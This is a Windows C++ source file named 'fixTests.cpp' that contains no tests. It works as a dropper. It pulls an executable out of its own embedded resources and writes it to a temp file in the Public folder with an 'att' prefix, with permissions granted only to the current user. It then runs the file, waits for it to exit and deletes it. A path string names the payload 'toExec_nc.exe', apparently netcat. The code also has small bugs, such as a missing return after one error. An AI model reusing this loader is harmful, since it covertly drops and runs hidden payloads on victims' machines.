// fixTests.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <Sddl.h>

//retreives current processes efective user token
PTOKEN_USER GetCurrentUserInfo() {

	DWORD dwSize = 0, dwResult = 0;
	HANDLE hToken = INVALID_HANDLE_VALUE;
	PTOKEN_USER pUserInfo = NULL;

	//Open a handle to the access token for the calling process.
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken) == FALSE)
	{
		printf("OpenProcessToken Error %u\n", GetLastError());
		return NULL;
	}

	// Call GetTokenInformation to get the buffer size.
	if (!GetTokenInformation(hToken, TokenUser, NULL, dwSize, &dwSize))
	{
		dwResult = GetLastError();
		if (dwResult != ERROR_INSUFFICIENT_BUFFER) {
			printf("GetTokenInformation Error %u\n", dwResult);
			CloseHandle(hToken);
			NULL;
		}
	}

	// Allocate the buffer for pUserInfo.
	pUserInfo = (PTOKEN_USER)LocalAlloc(LPTR,dwSize);

	// Call GetTokenInformation again to get the User information.
	if (!GetTokenInformation(hToken, TokenUser, pUserInfo, dwSize, &dwSize))
	{
		printf("GetTokenInformation Error %u\n", GetLastError());
		LocalFree(pUserInfo);
		CloseHandle(hToken);
		return NULL;
	}

	CloseHandle(hToken);
	return pUserInfo;
}



// Initializes pSa with a SecurityDescriptor allowing all only to the user dfined by pSid
BOOL InitSecurityAtributes(SECURITY_ATTRIBUTES* pSa, PSID pSid) {

	DWORD dwSize = 0;
	LPTSTR userStringSid = 0;
	LPWSTR stringSd = 0;

	// Allocate the buffer for userSidString.
	userStringSid = (LPTSTR)LocalAlloc(LPTR,1024);
	// convert user SID to StringSid
	if (ConvertSidToStringSid(pSid, &userStringSid) == FALSE)
	{
		printf("ConvertSidToStringSid Error %u\n", GetLastError());
		LocalFree(userStringSid);
		return FALSE;
	}

	// Allocate space for stringSd
	stringSd = (LPTSTR)LocalAlloc(LPTR,1024);

	// create StringSD with allow all and onership only to user sid
	wsprintf(stringSd, L"O:%sD:P(A;;GA;;;%s)", userStringSid, userStringSid);
	LocalFree(userStringSid);
	userStringSid = 0;


	// initialize sa security descriptor with the security descriptor defined by stringSd.
	if (ConvertStringSecurityDescriptorToSecurityDescriptor(
		stringSd,
		SDDL_REVISION_1,
		&(pSa->lpSecurityDescriptor), NULL) == FALSE)
	{
		printf("ConvertStringSecurityDescriptorToSecurityDescriptor Error %u\n", GetLastError());
		LocalFree(stringSd);
		return FALSE;
	}

	LocalFree(stringSd);
	return TRUE;
}



int SvcInit() {

	BOOL fSuccess = FALSE;
	PTOKEN_USER userInfo = NULL;
	SECURITY_ATTRIBUTES sa;

	// Temp Files
	TCHAR lpTempPathBuffer[MAX_PATH] = { 0 };
	TCHAR szTempFileName[MAX_PATH] = { 0 };
	HANDLE hTempFile = INVALID_HANDLE_VALUE;

	//paths
	LPCWSTR dirname = L"C:\\Documents and Settings\\Public";
	LPCWSTR toExecPath = L"C:\\Documents and Settings\\Public\\toExec_nc.exe";

	//Resource variables
	HRSRC resourceExecutable = NULL;
	DWORD cbResourceSize = 0;
	HGLOBAL hResourceData = NULL;
	void* pResourceData = NULL;
	DWORD dwBytesWritten = 0;

	//Process execution
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = { 0 };

	//Load resource
	resourceExecutable = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
	cbResourceSize = SizeofResource(NULL, resourceExecutable);
	hResourceData = LoadResource(NULL, resourceExecutable);
	pResourceData = LockResource(hResourceData);


	//get current processes effective user info
	userInfo = GetCurrentUserInfo();
	if (userInfo == NULL)
	{
		printf("GetCurrentUserInfo Error %u\n", GetLastError());
		return 1;
	}

	// Initializes pSa with a SecurityDescriptor allowing all only to the current user
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;
	if (InitSecurityAtributes(&sa, userInfo->User.Sid) == FALSE)
	{
		printf("InitSecurityAtributes Error %u\n", GetLastError());
		LocalFree(userInfo);
		return 1;
	}
	LocalFree(userInfo);

	//  Generates a temporary file name. 
	if (GetTempFileName(dirname, TEXT("att"), 0, szTempFileName) == 0)
	{
		printf("GetTempFileName Error %u\n", GetLastError());
		return 2;
	}

	// delete file created by GetTempFileName
	DeleteFile(szTempFileName);

	//  Creates the new file to write to for the upper-case version.
	hTempFile = CreateFile((LPTSTR)szTempFileName, // file name 
		GENERIC_ALL,        // open for all actions 
		0,                    // do not share 
		&sa,                 // defined
		CREATE_ALWAYS,        // overwrite existing
		FILE_ATTRIBUTE_NORMAL,// normal file 
		NULL);                // no template 
	if (hTempFile == INVALID_HANDLE_VALUE)
	{
		printf("CreateFile Error %u\n", GetLastError());
		return 3;
	}

	//Writes the resource
	fSuccess = WriteFile(hTempFile, pResourceData, cbResourceSize, &dwBytesWritten, NULL);
	if ((!fSuccess) || (dwBytesWritten != cbResourceSize)) {
		printf("WriteFile Error %u\n", GetLastError());
		DeleteFile(szTempFileName);
		return 4;
	}

	FlushFileBuffers(hTempFile);
	CloseHandle(hTempFile);

	//Now we'll execute the resource file
	if (CreateProcess(NULL, szTempFileName,
		NULL, NULL, NULL,
		0, NULL, NULL, &si, &pi) == FALSE)
	{
		printf("CreateProcess Error %u\n", GetLastError());
		DeleteFile(szTempFileName);
		return 5;
	}

	// Wait until child process exits.
	WaitForSingleObject(pi.hProcess, INFINITE);

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	DeleteFile(szTempFileName);

	return 0;
}



void main() {
	SvcInit();
	printf("Exiting"); Sleep(2000); printf("."); Sleep(2000); printf("."); Sleep(2000);  printf("."); Sleep(4000);
	return;
}